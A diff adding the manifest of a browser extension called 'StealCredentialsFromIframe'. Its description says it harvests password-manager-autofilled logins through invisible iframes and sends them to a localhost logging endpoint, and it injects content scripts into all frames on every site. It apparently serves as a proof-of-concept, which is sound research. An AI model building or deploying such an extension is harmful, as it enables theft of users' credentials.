@@ -1,0 +1,26 @@
+{
+    "manifest_version": 2,
+
+    "name": "StealCredentialsFromIframe",
+    "description": "Extension that steals the data from an login form if the browser's password manager has filled in the credentials. Sends data to http://localhost:3000/log without the need for any host permissions. Explicitly opens login web pages in invinsible iframes in any web page." ,
+    "version": "1.0",
+	
+	"content_scripts": [
+		{
+			"js": ["jquery.js", "content.js"],
+			"matches" : ["https://*/*", "http://*/*"],
+			"all_frames" : true
+		}
+	],
+	
+	"background": {
+		"scripts": ["background.js"]
+	},
+
+	"permissions": [
+		"webRequest",
+		"webRequestBlocking",
+		"https://*/*",
+		"http://*/*"
+	]
+}
